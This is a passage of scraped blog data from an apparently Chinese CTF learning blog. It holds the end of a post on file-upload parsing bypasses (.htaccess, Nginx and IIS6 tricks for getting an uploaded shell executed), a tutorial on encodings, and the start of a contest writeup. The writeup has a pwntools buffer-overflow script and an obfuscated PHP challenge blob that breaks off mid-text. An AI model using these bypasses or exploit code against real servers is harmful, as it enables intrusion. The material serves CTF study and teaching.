在此.htaccess目录创建a.xxx文件，在里面写入： &lt;?php echo &#39;good&#39;; ?&gt; 发现其被解析成了php： Ngnix Nginx版本： 1234Nginx 0.5.*Nginx 0.6.*Nginx 0.7 &lt;&#x3D; 0.7.65Nginx 0.8 &lt;&#x3D; 0.8.37 以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求 Nginx版本： 1Nginx 0.8.41 – 1.5.6： 以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求 IIS6.0IIS6.0属于winserver下的服务器 asp即 active server pages，是microsoft公司开发的服务端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序 目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析 文件名中如果包含.asp;、.asa;、.cer;则优先使用asp解析，如asa.asa;asa.jpg 参考： https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.moonback.xyz/tags/web/"},{"name":"文件上传","slug":"文件上传","permalink":"http://www.moonback.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"进制与编码","slug":"binary-coding","date":"2019-08-16T09:46:24.000Z","updated":"2019-10-17T05:52:54.140Z","comments":true,"path":"2019/08/16/binary-coding/","link":"","permalink":"http://www.moonback.xyz/2019/08/16/binary-coding/","excerpt":"本篇博客主要介绍了CTF中一些常见的进制和编码方式！","text":"本篇博客主要介绍了CTF中一些常见的进制和编码方式！ 二进制二进制数据是用0和1两个数码来表示的数，当前的计算机系统使用的基本上是二进制系统。 二进制（简称Bin)为什么用八位来表示？ 八位（8bit）是一个字节，计算机中只要一个字节就可以存放ASCII编码，就是所有的数字、大小写字母和一些特殊字符（总共255个）。所以在计算机中对用户来说有意义的单位就是字节，这是我们可以看懂的。八位的二进制数最大值就是255，刚好表示255个ASCII字符 八进制八进制，Octal，缩写OCT或O，一种以8为基数的计数法，采用0，1，2，3，4，5，6，7八个数字，逢八进1。一些编程语言中常常以数字0开始表明该数字是八进制。八进制的数和二进制数可以按位对应（八进制一位对应二进制三位），因此常应用在计算机语言中。 十六进制十六进制（简写为hex或下标16）在数学中是一种逢16进1的进位制。一般用数字0到9和字母A到F（或af）表示，其中:AF表示10~15，这些称作十六进制数字。 一般以0x开头的都是十六进制形式，且是两位来表示，16x16=2^8,刚好和二进制对应 ASCII编码ASCII ((American Standard Code for Information Interchange): 美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是最通用的信息交换标准，并等同于国际标准ISO/IEC 646。 第0～32号及第127号(共34个)是控制字符或通讯专用字符，如控制符：LF（换行）、CR（回车）、FF（换页）、DEL（删除）、BEL（振铃）等；通讯专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等； 第33～126号(共94个)是字符，其中第48～57号为0～9十个阿拉伯数字；65～90号为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等。 示例源文本：The quick brown fox jumps over the lazy dog ASCII编码对应十进制： 84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103 Unicode编码历史问题英语用 128 个字符来编码完全是足够的，但是用来表示其他语言，128 个字符是远远不够的。于是，一些欧洲的国家就决定，将 ASCII 码中闲置的最高位利用起来，这样一来就能表示 256 个字符。但是，这里又有了一个问题，那就是不同的国家的字符集可能不同，就算它们都能用 256 个字符表示全，但是同一个码点（也就是 8 位二进制数）表示的字符可能可能不同。例如，144 在阿拉伯人的 ASCII 码中是 گ，而在俄罗斯的 ASCII 码中是 ђ。 因此，ASCII 码的问题在于尽管所有人都在 0 - 127 号字符上达成了一致，但对于 128 - 255 号字符上却有很多种不同的解释。与此同时，亚洲语言有更多的字符需要被存储，一个字节已经不够用了。于是，人们开始使用两个字节来存储字符。 各种各样的编码方式成了系统开发者的噩梦，因为他们想把软件卖到国外。于是，他们提出了一个“内码表”的概念，可以切换到相应语言的一个内码表，这样才能显示相应语言的字母。在这种情况下，如果使用多语种，那么就需要频繁的在内码表内进行切换。 Unicode最终，美国人意识到他们应该提出一种标准方案来展示世界上所有语言中的所有字符，出于这个目的，Unicode诞生了。 Unicode 当然是一本很厚的字典，记录着世界上所有字符对应的一个数字。具体是怎样的对应关系，又或者说是如何进行划分的，就不是我们考虑的问题了，我们只用知道 Unicode 给所有的字符指定了一个数字用来表示该字符。 对于 Unicode 有一些误解，它仅仅只是一个字符集，规定了符合对应的二进制代码，至于这个二进制代码如何存储则没有任何规定。它的想法很简单，就是为每个字符规定一个用来表示该字符的数字，仅此而已。 Unicode 编码方案之前提到，Unicode 没有规定字符对应的二进制码如何存储。以汉字“汉”为例，它的 Unicode 码点是 0x6c49，对应的二进制数是 110110001001001，二进制数有 15 位，这也就说明了它至少需要 2 个字节来表示。可以想象，在 Unicode 字典中往后的字符可能就需要 3 个字节或者 4 个字节，甚至更多字节来表示了。 这就导致了一些问题，计算机怎么知道你这个 2 个字节表示的是一个字符，而不是分别表示两个字符呢？这里我们可能会想到，那就取个最大的，假如 Unicode 中最大的字符用 4 字节就可以表示了，那么我们就将所有的字符都用 4 个字节来表示，不够的就往前面补 0。这样确实可以解决编码问题，但是却造成了空间的极大浪费，如果是一个英文文档，那文件大小就大出了 3 倍，这显然是无法接受的。 于是，为了较好的解决 Unicode 的编码问题， UTF-8 和 UTF-16 两种当前比较流行的编码方式诞生了。当然还有一个 UTF-32 的编码方式，也就是上述那种定长编码，字符统一使用 4 个字节，虽然看似方便，但是却不如另外两种编码方式使用广泛。 UTF-8UTF-8 是一个非常惊艳的编码方式，漂亮的实现了对 ASCII 码的向后兼容，以保证 Unicode 可以被大众接受。 UTF-8 是目前互联网上使用最广泛的一种 Unicode 编码方式，它的最大特点就是可变长。它可以使用 1 - 4 个字节表示一个字符，根据字符的不同变换长度。编码规则如下： 对于单个字节的字符，第一位设为 0，后面的 7 位对应这个字符的 Unicode 码点。因此，对于英文中的 0 - 127 号字符，与 ASCII 码完全相同。这意味着 ASCII 码那个年代的文档用 UTF-8 编码打开完全没有问题。 对于需要使用 N 个字节来表示的字符（N &gt; 1），第一个字节的前 N 位都设为 1，第 N + 1 位设为0，剩余的 N - 1 个字节的前两位都设位 10，剩下的二进制位则使用这个字符的 Unicode 码点来填充。 编码规则如下： Unicode 十六进制码点范围 UTF-8 二进制 0000 0000 - 0000 007F 0xxxxxxx 0000 0080 - 0000 07FF 110xxxxx 10xxxxxx 0000 0800 - 0000 FFFF 1110xxxx 10xxxxxx 10xxxxxx 0001 0000 - 0010 FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 根据上面编码规则对照表，进行 UTF-8 编码和解码就简单多了。下面以汉字“汉”为利，具体说明如何进行 UTF-8 编码和解码。 “汉”的 Unicode 码点是 0x6c49（110 1100 0100 1001），通过上面的对照表可以发现，0x0000 6c49 位于第三行的范围，那么得出其格式为 1110xxxx 10xxxxxx 10xxxxxx。接着，从“汉”的二进制数最后一位开始，从后向前依次填充对应格式中的 x，多出的 x 用 0 补上。这样，就得到了“汉”的 UTF-8 编码为 11100110 10110001 10001001，转换成十六进制就是 0xE6 0xB7 0x89。 解码的过程也十分简单：如果一个字节的第一位是 0 ，则说明这个字节对应一个字符；如果一个字节的第一位1，那么连续有多少个 1，就表示该字符占用多少个字节。 UTF-16在了解 UTF-16 编码方式之前，先了解一下另外一个概念——“平面”。 在上面的介绍中，提到了 Unicode 是一本很厚的字典，她将全世界所有的字符定义在一个集合里。这么多的字符不是一次性定义的，而是分区定义。每个区可以存放 65536 个（2^16）字符，称为一个平面（plane）。目前，一共有 17 个（2^5）平面，也就是说，整个 Unicode 字符集的大小现在是 2^21。 最前面的 65536 个字符位，称为基本平面（简称 BMP ），它的码点范围是从 0 到 2^16-1，写成 16 进制就是从 U+0000 到 U+FFFF。所有最常见的字符都放在这个平面，这是 Unicode 最先定义和公布的一个平面。剩下的字符都放在辅助平面（简称 SMP ），码点范围从 U+010000 到 U+10FFFF。 基本了解了平面的概念后，再说回到 UTF-16。UTF-16 编码介于 UTF-32 与 UTF-8 之间，同时结合了定长和变长两种编码方法的特点。它的编码规则很简单：基本平面的字符占用 2 个字节，辅助平面的字符占用 4 个字节。也就是说，UTF-16 的编码长度要么是 2 个字节（U+0000 到 U+FFFF），要么是 4 个字节（U+010000 到 U+10FFFF）。那么问题来了，当我们遇到两个字节时，到底是把这两个字节当作一个字符还是与后面的两个字节一起当作一个字符呢？ 这里有一个很巧妙的地方，在基本平面内，从 U+D800 到 U+DFFF 是一个空段，即这些码点不对应任何字符。因此，这个空段可以用来映射辅助平面的字符。 辅助平面的字符位共有 2^20 个，因此表示这些字符至少需要 20 个二进制位。UTF-16 将这 20 个二进制位分成两半，前 10 位映射在 U+D800 到 U+DBFF，称为高位（H），后 10 位映射在 U+DC00 到 U+DFFF，称为低位（L）。这意味着，一个辅助平面的字符，被拆成两个基本平面的字符表示。 因此，当我们遇到两个字节，发现它的码点在 U+D800 到 U+DBFF 之间，就可以断定，紧跟在后面的两个字节的码点，应该在 U+DC00 到 U+DFFF 之间，这四个字节必须放在一起解读。 接下来，以汉字”𠮷”为例，说明 UTF-16 编码方式是如何工作的。 汉字”𠮷”的 Unicode 码点为 0x20BB7，该码点显然超出了基本平面的范围（0x0000 - 0xFFFF），因此需要使用四个字节表示。首先用 0x20BB7 - 0x10000 计算出超出的部分，然后将其用 20 个二进制位表示（不足前面补 0 ），结果为0001000010 1110110111。接着，将前 10 位映射到 U+D800 到 U+DBFF 之间，后 10 位映射到 U+DC00 到 U+DFFF 即可。U+D800 对应的二进制数为 1101100000000000，直接填充后面的 10 个二进制位即可，得到 1101100001000010，转成 16 进制数则为 0xD842。同理可得，低位为 0xDFB7。因此得出汉字”𠮷”的 UTF-16 编码为 0xD842 0xDFB7。 Unicode3.0 中给出了辅助平面字符的转换公式： H = Math.floor((c-0x10000) / 0x400)+0xD800 L = (c - 0x10000) % 0x400 + 0xDC00 根据编码公式，可以很方便的计算出字符的 UTF-16 编码。 示例 Unicode编码有以下四种编码方式： 源文本：The &amp;#x [Hex]：&amp;amp;#x0054;&amp;amp;#x0068;&amp;amp;#x0065; &amp;# [Decimal]：&amp;amp;#00084;&amp;amp;#00104;&amp;amp;#00101; \\U [Hex]：\\U0054\\U0068\\U0065 \\U+ [Hex]：\\U+0054\\U+0068\\U+0065 URL编码url编码是一种浏览器用来打包表单输入的格式。浏览器从表单中获取所有的name和其中的值 ，将它们以name/value参数编码（移去那些不能传送的字符，将数据排行等等）作为URL的一部分或者分离地发给服务器。 为什么要URL编码？在因特网上传送URL，只能采用ASCII字符集 也就是说URL只能使用英文字母、阿拉伯数字和某些标点符号，不能使用其他文字和符号，即只有字母和数字[0-9a-zA-Z]、一些特殊符号$-_.+!*&#39;()(不包括双引号)、以及某些保留字（空格转换为+），才可以不经过编码直接用于URL这意味着 如果URL中有汉字，就必须编码后使用。 如何编码URL编码通常也被称为百分号编码（percent-encoding），是因为它的编码方式非常简单： 使用%加上两位的字符——0123456789ABCDEF——代表一个字节的十六进制形式。URL编码要做的，就是将每一个非安全的ASCII字符都被替换为“%xx”格式，对于非ASCII字符，RFC文档建议使用utf-8对其进行编码得到相应的字节，然后对每个字节执行百分号编码。如”中文”使用UTF-8字符集得到的字节为0xE4 0xB8 0xAD 0xE6 0x96 0x87，经过Url编码之后得到%E4%B8%AD%E6%96%87。 示例 源文本：The quick brown fox jumps over the lazy dog 编码后： %54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67 HTML实体编码在 HTML 中，某些字符是预留的。 在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。 如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。 字符实体类似这样： &amp;entity_name; 或者 &amp;#entity_number; 如需显示小于号，我们必须这样写：&amp;lt; 或&amp;#60; 参考： https://www.cnblogs.com/crazylqy/p/10184291.html https://www.cnblogs.com/xzwblog/p/6932870.html https://uknowsec.cn/posts/ctf/CTF中那些脑洞大开的编码和加密.html","categories":[],"tags":[{"name":"进制","slug":"进制","permalink":"http://www.moonback.xyz/tags/%E8%BF%9B%E5%88%B6/"},{"name":"编码","slug":"编码","permalink":"http://www.moonback.xyz/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"中原工学院Drops夏令营新生赛writeup","slug":"drops-new-2019","date":"2019-08-15T10:53:21.000Z","updated":"2019-10-17T05:54:00.694Z","comments":true,"path":"2019/08/15/drops-new-2019/","link":"","permalink":"http://www.moonback.xyz/2019/08/15/drops-new-2019/","excerpt":"本篇博客记录了本人参加drops攻防训练营最后的新生赛的一些writeup,很菜，勿喷！！！","text":"本篇博客记录了本人参加drops攻防训练营最后的新生赛的一些writeup,很菜，勿喷！！！ pwnpwn1和攻防世界level0相似，改下之前前脚本就行 123456from pwn import *p &#x3D; remote(&quot;101.132.41.135&quot;,&quot;10000&quot;)v &#x3D; 0x80485E6payload &#x3D; 112*&#39;a&#39; + p32(v)p.sendline(payload)p.interactive() v是后门函数的地址 112*’a’代表0x6c大小的buf加上32位4个字节的ebp pwn2pwn3webchaos file打开网址看到是这样的： 把php代码整理一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php $_ &#x3D; &lt;&lt;&lt;asdfiohaefhoVm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doV1YwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldoVVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldoVFYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0docFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowed&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklUm1SWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_